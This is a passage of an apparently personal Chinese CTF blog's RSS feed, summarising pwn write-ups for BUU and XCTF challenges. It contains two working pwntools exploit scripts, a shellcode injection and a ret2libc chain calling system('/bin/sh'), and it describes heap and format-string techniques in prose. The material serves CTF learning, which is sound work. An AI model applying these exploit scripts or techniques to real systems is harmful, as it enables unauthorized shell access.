&lt;p>这里s可以把ptr溢出掉实现任意地址写。注意gets是读到&lt;code>'\n'&lt;/code>为止的，&lt;code>'\x00'&lt;/code>并不会使它停止读入。&lt;/p></description></item><item><title>xctf-EasyPwn-WP</title><link>https://chujdk.github.io/wp/1037.html</link><pubDate>Thu, 28 Jan 2021 10:34:49 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1037.html</guid><description>&lt;p>很久没做xctf的题了，这道题其实不难，但是漏洞点不容易看出来（菜如我就没看出来）&lt;/p>
&lt;div style="text-align:center">&lt;img src=" https://chujdk.github.io/usr/uploads/2021/01/2916240166.png
">&lt;/div>
&lt;p>这里的&lt;code>v2&lt;/code>其实是有溢出的，&lt;code>v2&lt;/code>的大小仅有&lt;code>0x3EB&lt;/code>，&lt;code>s&lt;/code>的大小却有&lt;code>0x400&lt;/code>，这样就可以覆写v3，而C的格式化字符串家族的函数对于格式化字符串的处理都是传入字符串头指针，向后遍历到&lt;code>'\x00'&lt;/code>为止的，所以我们在&lt;code>%s&lt;/code>后面接上格式化字符串也是有效的，又由于是栈上格式化字符串，可以容易地实现任意地址读写。比较麻烦的是参数位置的计算，本题中我还不知道该怎么算，就只能用老办法试了（也就是&lt;code>%p&lt;/code>打出值在gdb里面看stack比对，发现不是与rsp距离+6而是+4）。&lt;/p></description></item><item><title>BUU-SWPUCTF_2019_login-WP</title><link>https://chujdk.github.io/wp/1035.html</link><pubDate>Wed, 27 Jan 2021 17:42:23 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1035.html</guid><description>&lt;p>本来想改返回地址的，但是发现不论是&lt;code>one_gadget&lt;/code>还是&lt;code>system&lt;/code>都出现了&lt;code>dump core&lt;/code>，据说是32位程序这样改返回地址很容易爆，我也不知道为什么。最后还是覆写的&lt;code>printf@got&lt;/code>。&lt;/p></description></item><item><title>BUU-wustctf2020_easyfast-WP</title><link>https://chujdk.github.io/wp/1034.html</link><pubDate>Wed, 27 Jan 2021 13:07:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1034.html</guid><description>&lt;p>fastbin attack水题，大概是&lt;code>House Of Spirit&lt;/code>&lt;/p>
&lt;p>存在UAF,所以也不需要double free了，申请两个chunk，free掉他们，由于fastbin的LIFO策略，修改第二个chunk的fd指针为0x602080，然后malloc两次就可以对0x602090任意写。当然由于fastbin在分配时会检测被分配的chunk的&lt;code>size&lt;/code>的正确性&lt;/p></description></item><item><title>BUU-gyctf_2020_force-WP</title><link>https://chujdk.github.io/wp/1033.html</link><pubDate>Wed, 27 Jan 2021 10:05:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1033.html</guid><description>&lt;p>报以复习的形态做了一下这道HOF裸题，结果还是学到了新知识，蛮好蛮好&lt;/p>
&lt;p>HOF不想多说了，毕竟是挺简单的一种利用，&lt;a href="https://chujdk.github.io/WP/1018.html">此题&lt;/a>中有谈及。&lt;/p>
&lt;h3 id="leak">leak&lt;/h3>
&lt;p>每一个chunk的地址都是直接告诉我们的，但是程序可以说没有输出功能，通过以往的办法leak libc base不甚容易，但是我们可以利用mmap的chunk的特性来获取libc base，申请一个较大的chunk，此时由于top chunk等处都无法分配，就会通过mmap映射内存来分配，而内存的地址和libc的基地址的偏移是固定的，所以我们就可以调试获取偏移并算出libc base&lt;/p></description></item><item><title>BUU-wdb_2018_3rd_soEasy-WP</title><link>https://chujdk.github.io/wp/1029.html</link><pubDate>Tue, 26 Jan 2021 13:08:01 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1029.html</guid><description>&lt;p>名字都取成这样了，也不想说什么了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context(log_level &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;debug&amp;#39;&lt;/span>,arch &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;i386&amp;#39;&lt;/span>,os &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;linux&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#sh = process(&amp;#34;./wdb_2018_3rd_soEasy&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;node3.buuoj.cn&amp;#34;&lt;/span>,&lt;span style="color:#40a070">29310&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;-&amp;gt;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>addr &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020">int&lt;/span>(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>),base &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> asm(shellcraft&lt;span style="color:#666">.&lt;/span>sh())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;do?&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x48&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#40a070">4&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span>) &lt;span style="color:#666">+&lt;/span> p32(addr))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>BUU-[BJDCTF 2nd]rci-WP</title><link>https://chujdk.github.io/wp/1028.html</link><pubDate>Mon, 25 Jan 2021 20:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1028.html</guid><description>&lt;p>头图变成上篇文章的了，不知道为什么&lt;/p>
&lt;p>Linux操作题，也不需要写什么脚本&lt;/p>
&lt;p>程序很容易看，流程就是有一次ls的机会，第二次需要输入当前的目录，然后就有第二次&lt;code>system&lt;/code>的机会，这里就可以调出shell。&lt;/p></description></item><item><title>BUU-picoctf_2018_leak_me-WP</title><link>https://chujdk.github.io/wp/1023.html</link><pubDate>Sun, 24 Jan 2021 21:48:28 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1023.html</guid><description>&lt;p>这道题没什么难度，IDA没办法反编译，没办法，就硬看呗&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/3521573130.png
">&lt;/div>
&lt;p>有这个后门,需要我们输入一个正确的密码才可以执行，密码会先被读到内存中。&lt;/p>
&lt;p>而我们会输入自己的名字，可以输入0x100个字节&lt;/p></description></item><item><title>BUU-[极客大挑战 2019]Not Bad-WP</title><link>https://chujdk.github.io/wp/1019.html</link><pubDate>Sun, 24 Jan 2021 16:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1019.html</guid><description>&lt;p>这题其实挺简单的，但是我还是没做出来:(&lt;/p>
&lt;h3 id="新的观点">新的观点&lt;/h3>
&lt;p>原来在对于没开NX的题目可以考虑用&lt;code>jmp rsp&lt;/code>的gadget啊！学到了。题目中有这个gadget，所以我们不需要leak栈地址就可以直接执行我们的shellcode。当然这里的shellcode只能写0x28个字节，并且&lt;code>seccomp&lt;/code>禁用了除&lt;code>read,wirte,open,exit&lt;/code>之外的所有系统调用，长度是不够的，所以考虑在mmap的内存上写并执行&lt;/p></description></item><item><title>BUU-bcloud_bctf_2016-WP</title><link>https://chujdk.github.io/wp/1018.html</link><pubDate>Sat, 23 Jan 2021 18:34:46 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1018.html</guid><description>&lt;h4 id="发牢骚">发牢骚&lt;/h4>
&lt;p>考试周是真的烦，快一个星期没有碰pwn，做本题时的体验很差&lt;/p>
&lt;h3 id="知识点">知识点&lt;/h3>
&lt;p>本题是House Of系列中的House Of Force，也是我第一次接触House系列。总的来说HOF还是比较容易理解的，但是其条件比较苛刻。&lt;/p></description></item><item><title>BUU-inndy_echo3-WP</title><link>https://chujdk.github.io/wp/1012.html</link><pubDate>Sat, 16 Jan 2021 15:01:03 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1012.html</guid><description>&lt;p>虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。&lt;/p>
&lt;p>这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板”，但是由于要爆破，之前就一直没做，今天突然想起来，莫名其妙的胸有成竹了起来，就试着pwn了一下&lt;/p></description></item><item><title>BUU-metasequoia_2020_blacksmith-WP</title><link>https://chujdk.github.io/wp/1005.html</link><pubDate>Thu, 14 Jan 2021 19:09:51 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1005.html</guid><description>&lt;p>整数溢出，&lt;code>size_t&lt;/code>是一个不小压力机器字长的无符号整型，然鹅判断长度的时候&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/2936428237.png
">&lt;/div>
&lt;p>这里用的是&lt;code>signed int&lt;/code>，所以我们输入一个负数就可以轻松栈溢出了&lt;/p></description></item><item><title>BUU-picoctf_2018_buffer overflow 0-WP</title><link>https://chujdk.github.io/wp/1001.html</link><pubDate>Tue, 12 Jan 2021 14:39:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1001.html</guid><description>&lt;p>今天好像都是水题嘛。不过这题使用ssh连接直接给了一个没root权限的shell&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/2935915163.png
">&lt;/div>
&lt;p>不过有一个vuln，就是题目给出的elf。&lt;/p>
&lt;p>payload很好写，就是&lt;code>payload = &amp;quot;./vuln &amp;quot; + 'a' * 0x18 + p32(elf.plt[&amp;quot;puts&amp;quot;]) + 'reta' + p32(0x804A080)&lt;/code>，这个输进去就可以了，然后我发现&lt;code>pwntools&lt;/code>输不进去，蛮奇怪的。向大佬请教之后后来才知道是用法错了，文档里面是这样写的&lt;/p></description></item><item><title>BUU-cmcc_pwnme1-WP</title><link>https://chujdk.github.io/wp/999.html</link><pubDate>Tue, 12 Jan 2021 11:11:07 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/999.html</guid><description>&lt;p>完成任务很开心。栈溢出水题，没什么可说的，直接exp吧&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;node3.buuoj.cn&amp;#34;&lt;/span>,&lt;span style="color:#40a070">29136&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./pwnme1&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./libcs/buu-32-libc.so&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_ebp_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x80485f3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0xA4&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;b&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0x4&lt;/span> &lt;span style="color:#666">+&lt;/span> p32(elf&lt;span style="color:#666">.&lt;/span>symbols[&lt;span style="color:#4070a0">&amp;#34;puts&amp;#34;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p32(pop_ebp_ret) &lt;span style="color:#666">+&lt;/span> p32(elf&lt;span style="color:#666">.&lt;/span>got[&lt;span style="color:#4070a0">&amp;#34;puts&amp;#34;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p32(&lt;span style="color:#40a070">0x8048570&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;Exit &lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;5&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;fruit:&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;..&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#666">=&lt;/span> u32(sh&lt;span style="color:#666">.&lt;/span>recv(&lt;span style="color:#40a070">4&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>base &lt;span style="color:#666">=&lt;/span> puts_addr &lt;span style="color:#666">-&lt;/span> libc&lt;span style="color:#666">.&lt;/span>symbols[&lt;span style="color:#4070a0">&amp;#34;puts&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020">print&lt;/span> &lt;span style="color:#007020">hex&lt;/span>(base)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0xA4&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;b&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0x4&lt;/span> &lt;span style="color:#666">+&lt;/span> p32(base &lt;span style="color:#666">+&lt;/span> libc&lt;span style="color:#666">.&lt;/span>symbols[&lt;span style="color:#4070a0">&amp;#34;system&amp;#34;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">4&lt;/span> &lt;span style="color:#666">+&lt;/span> p32(base &lt;span style="color:#666">+&lt;/span> libc&lt;span style="color:#666">.&lt;/span>search(&lt;span style="color:#4070a0">&amp;#34;/bin/sh&amp;#34;&lt;/span>)&lt;span style="color:#666">.&lt;/span>next())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;Exit &lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;5&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;fruit:&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>题目给了后门，但是buu上后门没法用，所以就老老实实leak吧。&lt;/p></description></item><item><title>BUU-inndy_onepunch-WP</title><link>https://chujdk.github.io/wp/997.html</link><pubDate>Mon, 11 Jan 2021 15:53:35 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/997.html</guid><description>&lt;p>哈哈这道题其实没什么可说的，一看只有一次修改一个字节的机会，自然没什么思路&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/1462040760.png
">&lt;/div>
&lt;p>但是此题代码段可修改，所以我们修改一个&lt;code>jmp short&lt;/code>指令就可以让程序再次跳转到&lt;code>scanf&lt;/code>处了，这样就轻松地实现了多次利用。然后用同样地方法把&lt;code>shellcode&lt;/code>写入并执行就可以&lt;code>get shell&lt;/code>了。（关于&lt;code>jmp short&lt;/code>指令我曾经简单的在&lt;a href="https://chujdk.github.io/asm-learn/10-19%E6%B1%87%E7%BC%96.html">这篇文章&lt;/a>中记录过）&lt;/p></description></item><item><title>BUU-starctf_2019_babyshell-WP</title><link>https://chujdk.github.io/wp/994.html</link><pubDate>Sat, 09 Jan 2021 20:09:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/994.html</guid><description>&lt;p>这道题目很有意思，我很喜欢&lt;/p>
&lt;h3 id="分析">分析&lt;/h3>
&lt;p>流程很简单&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/4219005715.png
">&lt;/div>
&lt;p>这里读入一段，然后&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/3263974866.png
">&lt;/div>
&lt;p>进入这样一个判断，做的事就是对我们输入的串中的每个字母在&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/2466175477.png
">&lt;/div>
&lt;p>这个字符串里找匹配，如果每个都能匹配到，就执行我们输入的字符串（shellcode）。之前我也做的过类似的&lt;a href="https://chujdk.github.io/WP/buu-mrctf2020_shellcode_revenge-wp%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode.html">题目&lt;/a>，那道是可见字符shellcode，比这道题要求松一些，也有现成的工具。遗憾的是，本题没有工具生成，不会，看wp。&lt;/p></description></item><item><title>BUU-starctf2018_babystack-WP</title><link>https://chujdk.github.io/wp/985.html</link><pubDate>Sat, 09 Jan 2021 16:24:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/985.html</guid><description>&lt;p>这道题是碰到知识盲区了&lt;/p>
&lt;h3 id="写在前面">写在前面&lt;/h3>
&lt;p>这篇wp还不完善，之后再慢慢补全&lt;/p>
&lt;h3 id="漏洞点">漏洞点&lt;/h3>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/56663520.png
">&lt;/div>
&lt;p>非常明显的一个栈溢出，而且可以溢出非常多。当然，由于开了&lt;code>canary&lt;/code>，我就没思路了，毕竟确实没有得leak。不过呢这个函数是开了一个新的线程调用的，我当然是想到了和这个有关系的，于是就去查了一下条件竞争的利用，发现看不懂，而且好像也和这道题目没有什么关系。遂看wp。&lt;/p></description></item><item><title>KCTF-前世今生（PWN）/ASIS CTF Finals 2016 Heapstorm-WP</title><link>https://chujdk.github.io/wp/979.html</link><pubDate>Thu, 07 Jan 2021 18:14:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/979.html</guid><description>&lt;p>最近为了学习&lt;code>_IO_FILE&lt;/code>这一类的利用，在尝试阅读&lt;code>scanf&lt;/code>的源码，想找一点参考资料，就到看雪论坛上面看了看，资料没找到反而是发现看雪也有自己的题库，于是就找了这道难度分最低的题目试了试水。&lt;a href="https://ctf.pediy.com/itembank.htm">原题地址&lt;/a>&lt;/p></description></item><item><title>BUU-pwnable_simple_login/XCTF-formate2-WP</title><link>https://chujdk.github.io/wp/970.html</link><pubDate>Wed, 06 Jan 2021 15:27:19 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/970.html</guid><description>&lt;p>很简单的一个栈溢出，本来还以为真的是什么高级密码学&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/287439492.png"
>&lt;/div>
&lt;p>这里有一个栈溢出。虽然只溢出了四个字节，但是由于input在bss段，其地址已知，我们可以考虑通过leave栈迁移至input。由于题目给出了后面函数，我们直接ret到那里去就可以了。&lt;/p></description></item><item><title>BUU-warmup(PWN)-WP</title><link>https://chujdk.github.io/wp/964.html</link><pubDate>Wed, 06 Jan 2021 14:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/964.html</guid><description>&lt;p>这道题做的特别难受，也浪费了很多时间，确实是状态太差了。最近有一点小失意，发现好像什么题都不会做了。&lt;/p>
&lt;p>这道题就是一个简单的ret2syscall，直接看exp吧&lt;/p></description></item><item><title>BUU-picoctf_2018_echooo-WP</title><link>https://chujdk.github.io/wp/966.html</link><pubDate>Tue, 05 Jan 2021 23:37:42 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/966.html</guid><description>&lt;p>其实这题之前还做了一道，但是有点晚了，而且做这俩题浪费了很多时间，有点不高兴，那个的wp就明天再说吧&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/2502770741.png">&lt;/div>
&lt;p>没什么可说的,偏移是8，nc上去&lt;code>%8$s&lt;/code>就可以了&lt;/p></description></item><item><title>XCTF-250-WP</title><link>https://chujdk.github.io/wp/960.html</link><pubDate>Mon, 04 Jan 2021 23:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/960.html</guid><description>&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/2684558798.png">&lt;/div>
&lt;p>这个 &lt;code>print&lt;/code>，不仔细看怎么看的出来！（这个v4我愚蠢地以为是识别错误）浪费我半个小时想到底怎么用fmt利用！更可气的是xctf上还没什么人做，让我以为很难，又是什么我没学过的高级利用，点开 &lt;code>print&lt;/code>一看，好嘛，就是这么简单枯燥的一个栈溢出！&lt;/p></description></item><item><title>XCTF-echo_back2-WP</title><link>https://chujdk.github.io/wp/952.html</link><pubDate>Mon, 04 Jan 2021 13:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/952.html</guid><description>&lt;h4 id="写在前面">写在前面&lt;/h4>
&lt;p>由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/1913441300.png">&lt;/div>
&lt;p>可见在本机，覆盖stdin的_IO_buf_base最低字节为0的话，是达不到修改_IO_buf_base的效果的。其实我已经用patchelf替换了libc，但是还是无法还原靶机。打算是之后搭建一套docker环境尽量还原靶机来对这类题进行动调。&lt;/p></description></item><item><title>XCTF-Aul-WP</title><link>https://chujdk.github.io/wp/938.html</link><pubDate>Sat, 02 Jan 2021 22:31:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/938.html</guid><description>&lt;p>蛮好玩的一道题&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/1216273726.png">&lt;/div>
&lt;p>一看附件暂无，抱着怀疑的心态nc了一下&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/604002860.png">&lt;/div>
&lt;p>进行了三次尝试后终于有光了，输入help试一下&lt;/p>
&lt;div style="text-align: center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/576979473.png")>&lt;/div>
&lt;p>发现输出了一堆奇怪的东西，说实话我就看懂了一个lua，回想起之前做过的&lt;a href="https://chujdk.github.io/WP/xctf-monkey-wp.html">XCTF-monkey-WP&lt;/a>，我猜他是一个lua解释器，于是信息搜集了一下，得知&lt;code>os.execute ([command])&lt;/code>就可以实现类似C中system函数的功能。考虑尝试一下&lt;/p></description></item><item><title>XCTF/BUU/pwnable-dubblesort-WP</title><link>https://chujdk.github.io/wp/919.html</link><pubDate>Sat, 02 Jan 2021 14:35:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/919.html</guid><description>&lt;h3 id="灵感">灵感&lt;/h3>
&lt;p>故事是这样的，拿到题目放到ida里分析，发现是个冒泡，同时数组可以随便越界，又给了libc，感觉挺熟悉的，应该可切，然后到虚拟机里checksec,发现一片绿&lt;/p></description></item><item><title>XCTF-1000levevls-WP</title><link>https://chujdk.github.io/wp/903.html</link><pubDate>Fri, 01 Jan 2021 18:29:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/903.html</guid><description>&lt;h5 id="一些废话">&lt;em>一些废话&lt;/em>&lt;/h5>
&lt;p>&lt;em>这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修改rbp实现leak system的四个字节（前提是发现ida的一个识别错误），处理起来非常的麻烦，可以说很难想出这个解法。当然我是什么解法都不会的，从网络上的wp中发现了非常容易实现的利用方法，但是在大多数机器上都无法实现利用，而xctf的靶机恰巧不属于这大多数&lt;/em>&lt;/p></description></item><item><title>XCTF/BUU-babyfengshui-WP</title><link>https://chujdk.github.io/wp/895.html</link><pubDate>Fri, 01 Jan 2021 12:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/895.html</guid><description>&lt;p>XCTF总是给出一个错误的libc，让我对无法get shell百思不得其解，真是不友好，以后统一用LibcSearcher解决libc的问题吧。
这道题其实挺简单的，但是我还是做了很久，主要是没理解对输入长度的判断。&lt;/p></description></item><item><title>XCTF-HMI流水灯运行-WP</title><link>https://chujdk.github.io/wp/xctf-hmi%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C-wp.html</link><pubDate>Wed, 30 Dec 2020 16:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-hmi%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C-wp.html</guid><description>&lt;!-- wp:paragraph -->
&lt;p>这道题目挺有点意思，也让我知道了工控安全在ctf是怎么体现的。&lt;/p>
&lt;!-- /wp:paragraph -->
&lt;!-- wp:paragraph -->
&lt;p>其实很简单&lt;/p>
&lt;!-- /wp:paragraph -->
&lt;!-- wp:image {"align":"center","id":882,"sizeSlug":"large","linkDestination":"none"} -->
